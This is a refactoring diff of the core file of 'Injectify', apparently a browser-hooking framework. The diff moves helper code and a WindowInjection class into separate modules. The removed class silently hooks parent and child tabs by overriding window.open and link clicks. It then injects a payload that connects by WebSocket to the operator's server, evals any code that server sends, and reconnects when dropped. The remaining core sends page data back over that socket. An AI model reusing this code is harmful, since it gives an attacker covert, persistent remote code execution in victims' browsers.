@@ -1,119 +1,9 @@
-import { Injectify } from './definitions/core'
-declare var ws: any
-declare var client: any
-declare var process: any
-declare var require: any
-
-/**
- * JSON decycle
- * https://github.com/douglascrockford/JSON-js/blob/master/cycle.js
- */
-// @ts-ignore
-"function"!=typeof JSON.decycle&&(JSON.decycle=function(n,e){"use strict";var t=new WeakMap;return function n(c,o){var i,r;return void 0!==e&&(c=e(c)),"object"!=typeof c||null===c||c instanceof Boolean||c instanceof Date||c instanceof Number||c instanceof RegExp||c instanceof String?c:void 0!==(i=t.get(c))?{$ref:i}:(t.set(c,o),Array.isArray(c)?(r=[],c.forEach(function(e,t){r[t]=n(e,o+"["+t+"]")})):(r={},Object.keys(c).forEach(function(e){r[e]=n(c[e],o+"["+JSON.stringify(e)+"]")})),r)}(n,"$")});
-
-/**
- * Returns a string-representation of a variables instance
- */
-function instanceOf(string: any) {
-	try {
-		if (typeof string === 'undefined') {
-			return 'undefined'
-		} else if (typeof string === 'number') {
-			return 'number'
-		} else if (string === null) {
-			return 'null'
-		} else if (string.constructor) {
-			var type = string.constructor.toString()
-			if (!type) return typeof string
-			type = type.split(' ')[1]
-			if (!type) return typeof string
-			type = type.slice(0, -2).toLowerCase()
-			return type
-		} else {
-			return typeof string
-		}
-	} catch(e) {
-		return typeof string
-	}
-}
-
-/**
- * Window-injection
- *
- * Transparently hooks the current page's parent
- * and child windows. Doesn't work cross-domain
- */
-class WindowInjection {
-	open = window.open
-	constructor() {
-		injectify.setState({
-			windowInjection: true
-		})
-		if (window.opener) {
-			injectify.debugLog('window-injection', 'warn', 'Listening! Any links on this page - will automatically be hooked')
-		} else {
-			injectify.debugLog('window-injection', 'warn', 'Listening! Links opened in a new tab from this page - will automatically be hooked')
-		}
-		this.hookChildren()
-		this.hookParent()
-	}
-
-	hook(target, relation: string = '') {
-		let code = `!function u(){window.ws=new WebSocket(${JSON.stringify(injectify.info.server.websocket)}),ws.onmessage=function(d){try{d=JSON.parse(d.data),eval(d.d)}catch(e){ws.send(JSON.stringify({t:"e",d:e.stack}))}},ws.onclose=function(){setTimeout(u,3e3)}}()`
-		if (target) {
-			if (target.location && target.location.href !== 'about:blank') {
-				if (target.window.injectify) return
-				injectify.debugLog('window-injection', 'warn', `Successfully hooked ${relation} tab ${target.location.href}`)
-				if (target.window && typeof target.window.eval === 'function') {
-					target.window.eval(code)
-				} else if (target.location && target.location.href) {
-					target.location = `javascript:${code}`
-				}
-			} else {
-				target.addEventListener('DOMContentLoaded', () => {
-					if (target.window.injectify) return
-					injectify.debugLog('window-injection', 'warn', `Successfully hooked ${relation} tab ${target.location.href}`)
-					if (target.window && typeof target.window.eval === 'function') {
-						target.window.eval(code)
-					} else if (target.location && target.location.href) {
-						target.location = `javascript:${code}`
-					}
-				})
-			}
-		}
-	}
-
-	hookParent() {
-		if (window.opener) this.hook(window.opener, 'parent')
-	}
-
-	hookChildren() {
-		let { hook, open } = this
-		/**
-		 * Hook all <a> tags
-		 */
-		let links = document.getElementsByTagName('a')
-		for (let i = 0; i < links.length; i++) {
-			let link = links[i]
-			if (link && link.href && (link.target === '_blank' || window.opener)) {
-				link.addEventListener('click', event => {
-					if (link.target === '_blank' || window.opener) {
-						event.preventDefault()
-						let child = open(link.href)
-						hook(child, 'child')
-						if (window.opener) window.close()
-					}
-				})
-			}
-		}
-
-		window.open = function () {
-			let target = open.apply(this, arguments)
-			hook(target, 'child')
-			return target
-		}
-	}
-}
+import { Injectify } from '../definitions/core'
+declare let ws, require, client, process: any
+// Components
+import WindowInjection from './components/WindowInjection'
+import Decycle from './lib/JSON-Decycle'
+import instanceOf from './lib/InstanceOf'
 
 /**
  * Injectify core API
@@ -182,7 +72,7 @@ window['injectify'] = class Injectify {
 		if (ws.readyState == 0) return
 		try {
 			// @ts-ignore
-			ws.send(JSON.stringify(JSON.decycle({
+			ws.send(JSON.stringify(new Decycle({
 				t: topic,
 				d: data,
 			})))
@@ -350,7 +240,7 @@ window['injectify'] = class Injectify {
 		} else {
 			return {
 				window: {
-					url: require('file-url')(process.cwd()),
+					url: eval(`require('file-url')(process.cwd())`),
 					title: process.cwd(),
 					active: true,
 				}
@@ -492,7 +382,7 @@ injectify.listener((data, topic) => {
 			/**
 			 * Create the module object
 			 */
-			var module = {
+			var Module = {
 				name: data.name,
 				token: data.token,
 				callback: window[data.token] || function() {}, // Fallback function if no callback was specified
@@ -514,14 +404,14 @@ injectify.listener((data, topic) => {
 				 * If in debug mode display verbose output
 				 */
 				if (injectify.debug) {
-					injectify.debugLog('module', 'warn', `Executed module "${module.name}"`)
+					injectify.debugLog('module', 'warn', `Executed module "${Module.name}"`)
 				}
 
 				/**
 				 * If the module isn't asynchronous call it's callback
 				 */
-				if (!module.config.async && data !== false && typeof module.callback == 'function') {
-					module.callback(module.returned)
+				if (!Module.config.async && data !== false && typeof Module.callback == 'function') {
+					Module.callback(Module.returned)
 				}
 
 				/**
@@ -530,7 +420,7 @@ injectify.listener((data, topic) => {
 				return delete window[data.token]
 			} else {
 				if (data.error.message) injectify.error(`📦 ${data.error.message}`, module)
-				module.reject(data.error.message)
+				Module.reject(data.error.message)
 			}
 		}
 		if (topic == 'execute') {
